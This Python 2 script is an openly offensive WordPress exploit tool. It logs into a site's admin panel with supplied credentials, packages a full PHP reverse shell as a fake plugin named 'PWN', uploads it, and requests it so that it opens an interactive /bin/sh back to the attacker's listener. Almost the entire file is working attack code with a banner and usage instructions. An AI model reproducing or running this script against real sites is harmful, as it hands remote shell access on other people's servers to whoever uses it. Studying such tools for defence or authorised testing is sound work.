#!/usr/bin/python
#by _p1x1

import requests,sys,time,urllib3,os
from pwn import *
from zipfile import ZipFile
from colorama import init,Fore
init()

#PROXIE
#burp = { "http" : "http://127.0.0.1:8080" }


def usage():
	print Fore.RED+"\nHELP"
	print "-"*70
	print "\n\t[!] Usage: python %s <rhost> + <user> + <password> +<lhost> + <lport>\n" % sys.argv[0]
	print "\t[!] Example : python %s 10.10.10.223 admin password123 10.10.14.14 1234\n" % sys.argv[0]


def main(rhost,lhost,lport,user,password):
#BANNER
        print "-"*70
        print Fore.GREEN+".______   ____    __    ____ .__   __.    ____    __    ____ .______  "
	print "|   _  \  \   \  /  \  /   / |  \ |  |    \   \  /  \  /   / |   _  \ "
	print "|  |_)  |  \   \/    \/   /  |   \|  |     \   \/    \/   /  |  |_)  |" 
	print "|   ___/    \            /   |  . `  |      \            /   |   ___/  "
	print "|  |         \    /\    /    |  |\   |       \    /\    /    |  |      "
	print "| _|          \__/  \__/     |__| \__|        \__/  \__/     | _|      "
	print "                                                                       "
	print ".______    __       __    __    _______  __  .__   __. "
	print "|   _  \  |  |     |  |  |  |  /  _____||  | |  \ |  | "
	print "|  |_)  | |  |     |  |  |  | |  |  __  |  | |   \|  | "
	print "|   ___/  |  |     |  |  |  | |  | |_ | |  | |  . `  | "
	print "|  |      |  `----.|  `--'  | |  |__| | |  | |  |\   | "
	print "| _|      |_______| \______/   \______| |__| |__| \__| "+ Fore.RESET
	print Fore.YELLOW+"\n\n\t\t\t\t\t ====== _p1x1_ ====== "+Fore.RESET
	print "-"*70
	print ""



#REVERSE_SHELL_PHP_MONKEYPENTESTER

	pay = "\n<?php "
	pay += "\n/** "
	pay += "\n * Plugin Name:       PWN "
	pay += "\n * Version:           1.10.3 "
	pay += "\n * Author:            p1x1 "
	pay += "\n * Author URI:        https://author.example.com/ "
	pay += "\n * License:           GPL2 "
	pay += "\n */ "
	pay += "\n "
	pay += "\nset_time_limit (0); "
	pay += "\n$VERSION = \"1.0\"; "
	pay += "\n$ip = \'" + lhost + "\'; "
	pay += "\n$port = " + lport + "; "
	pay += "\n$chunk_size = 1400; "
	pay += "\n$write_a = null; "
	pay += "\n$error_a = null; "
	pay += "\n$shell = 'uname -a; w; id; /bin/sh -i'; "
	pay += "\n$daemon = 0; "
	pay += "\n$debug = 0; "
	pay += "\n "
	pay += "\nif (function_exists('pcntl_fork')) { "
	pay += "\n	$pid = pcntl_fork(); "
	pay += "\n	 "
	pay += "\n	if ($pid == -1) { "
	pay += "\n		printit(\"ERROR: Can't fork\"); "
	pay += "\n		exit(1); "
	pay += "\n	} "
	pay += "\n	 "
	pay += "\n	if ($pid) { "
	pay += "\n		exit(0);  // Parent exits "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	if (posix_setsid() == -1) { "
	pay += "\n		printit(\"Error: Can't setsid()\"); "
	pay += "\n		exit(1); "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	$daemon = 1; "
	pay += "\n} else { "
	pay += "\n	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); "
	pay += "\n} "
	pay += "\n "
	pay += "\nchdir(\"/\"); "
	pay += "\n "
	pay += "\numask(0); "
	pay += "\n "
	pay += "\n "
	pay += "\n$sock = fsockopen($ip, $port, $errno, $errstr, 30); "
	pay += "\nif (!$sock) { "
	pay += "\n	printit(\"$errstr ($errno)\"); "
	pay += "\n	exit(1); "
	pay += "\n} "
	pay += "\n "
	pay += "\n$descriptorspec = array( "
	pay += "\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from pipe"
	pay += "\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to pipe"
	pay += "\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to pipe"
	pay += "\n); "
	pay += "\n "
	pay += "\n$process = proc_open($shell, $descriptorspec, $pipes); "
	pay += "\n "
	pay += "\nif (!is_resource($process)) { "
	pay += "\n	printit(\"ERROR: Can't spawn shell\"); "
	pay += "\n	exit(1); "
	pay += "\n} "
	pay += "\n "
	pay += "\nstream_set_blocking($pipes[0], 0); "
	pay += "\nstream_set_blocking($pipes[1], 0); "
	pay += "\nstream_set_blocking($pipes[2], 0); "
	pay += "\nstream_set_blocking($sock, 0); "
	pay += "\n "
	pay += "\nprintit(\"Successfully opened reverse shell to $ip:$port\"); "
	pay += "\n "
	pay += "\nwhile (1) { "
	pay += "\n	// Check for end of TCP connection "
	pay += "\n	if (feof($sock)) { "
	pay += "\n		printit(\"ERROR: Shell connection terminated\"); "
	pay += "\n		break; "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	// Check for end of STDOUT "
	pay += "\n	if (feof($pipes[1])) { "
	pay += "\n		printit(\"ERROR: Shell process terminated\"); "
	pay += "\n		break; "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	$read_a = array($sock, $pipes[1], $pipes[2]); "
	pay += "\n	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); "
	pay += "\n "
	pay += "\n	if (in_array($sock, $read_a)) { "
	pay += "\n		if ($debug) printit(\"SOCK READ\"); "
	pay += "\n		$input = fread($sock, $chunk_size); "
	pay += "\n		if ($debug) printit(\"SOCK: $input\"); "
	pay += "\n		fwrite($pipes[0], $input); "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	if (in_array($pipes[1], $read_a)) { "
	pay += "\n		if ($debug) printit(\"STDOUT READ\"); "
	pay += "\n		$input = fread($pipes[1], $chunk_size); "
	pay += "\n		if ($debug) printit(\"STDOUT: $input\"); "
	pay += "\n		fwrite($sock, $input); "
	pay += "\n	} "
	pay += "\n "
	pay += "\n	if (in_array($pipes[2], $read_a)) { "
	pay += "\n		if ($debug) printit(\"STDERR READ\"); "
	pay += "\n		$input = fread($pipes[2], $chunk_size); "
	pay += "\n		if ($debug) printit(\"STDERR: $input\"); "
	pay += "\n		fwrite($sock, $input); "
	pay += "\n	} "
	pay += "\n} "
	pay += "\n "
	pay += "\nfclose($sock); "
	pay += "\nfclose($pipes[0]); "
	pay += "\nfclose($pipes[1]); "
	pay += "\nfclose($pipes[2]); "
	pay += "\nproc_close($process); "
	pay += "\n "
	pay += "\nfunction printit ($string) { "
	pay += "\n	if (!$daemon) { "
	pay += "\n		print \"$string\n\"; "
	pay += "\n	} "
	pay += "\n} "
	pay += "\n "
	pay += "\n?>  "
	pay += "\n "
	pay += "\n "
	pay += "\n "


#CREATING PLUGIN
	letters = string.ascii_lowercase
	l = ( ''.join(random.choice(letters) for i in range(6)) )

	print Fore.BLUE+"[!] Set your NETCAT LISTENING ON " +lport
	p1 = log.progress(Fore.RED+"Creating plugin")
	time.sleep(2)
	f = open(l+'.php','w+')
	for i in range(1):
		f.write(pay)
		f.close()

	zip = ZipFile(l+'.zip', 'w')
	zip.write(l+'.php')
	zip.close()
	os.system("rm -rf " +l+".php")
	p1.success(Fore.YELLOW+'Plugin created..')


#COOKIE_CONFIG

	s = None
	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False
	s.keep_alive = False

#URLS
	main_url = "http://" + rhost + "/wp-admin/&testcookie=1"
	login_url = "http://"+ rhost +"/wp-login.php"
	plugin_url_upload = "http://" + rhost + "/wp-admin/update.php?action=upload-plugin"


#POST_LOGIN

	p2 = log.progress(Fore.RED+"Trying to login")
	data = {
		'log' : user,
		'pwd' : password,
		'wp-submit' : 'Log In',
		'redirtect_to' : main_url 
	}
     	r = s.post(login_url, data=data, )

	time.sleep(1)

#UPLOADING_PLUGIN

	#EXTRACTING _WPNONCE
	try:
		nonce_url = "http://"+ rhost +"/wp-admin/plugin-install.php"

		t = 'value="[0-9a-z]{10}"'
		r = s.get(nonce_url)
		result = re.search(t, r.text)
		last = re.search('[0-9a-z]{10}', result.group(0))
		nonce = last.group(0)
		p2.success(Fore.YELLOW+"Logged in")

		referer = "http://"+ rhost +"/wp-admin/plugin-install.php"

# PLUGIN_DATA

		plugin_header = {
			'Referer' : referer,
			'Accept-Encoding' : "gzip, deflate"
		}

		plugin_data = {
				'_wp_http_referer' : '/main/wp-admin/plugin-install.php',
			'_wpnonce' : nonce
		}

		plugin_file = {
				'pluginzip' : open(l+'.zip', 'rb')
			}

		p3 = log.progress(Fore.RED+"Uploading plugin")
		response = s.post(plugin_url_upload, headers=plugin_header,data=plugin_data ,files=plugin_file)
		time.sleep(2)

		if response.ok:
			time.sleep(1)
			p3.success(Fore.YELLOW+"Uploaded")
			os.system("rm -rf " +l+".zip")
			time.sleep(2)
		else:
			p3.failure(Fore.RED+"[!] Error")
			sys.exit(1)

#ACTIVATE_PLUGIN

		try :
			p4 = log.progress(Fore.RED+"Activating plugin")
			rev_url = "http://"+ rhost +"/wp-content/plugins/"+l+"/"+l+".php"
			time.sleep(1)
			p4.status(Fore.YELLOW+"Activated")
			time.sleep(2)
			p4.success(Fore.YELLOW+"Access as : www-data")
			s.get(rev_url)
			sys.exit(0)

		except :
			p4.failure(Fore.RED+"Error")
			sys.exit(1)

        except AttributeError:
                nonce = None
                p2.failure(Fore.YELLOW+"Can't Login")
		sys.exit(1)

if __name__ == '__main__':

	try :
		if len(sys.argv) == 6:
			rhost = sys.argv[1]
			user = sys.argv[2]
			password = sys.argv[3]
			lhost = sys.argv[4]
			lport = sys.argv[5]

			main(rhost,lhost,lport,user,password)
		else :
			usage()
			sys.exit(1)

	except KeyboardInterrupt:
		print Fore.MAGENTA+"[!] EXITING..."
		sys.exit(1)
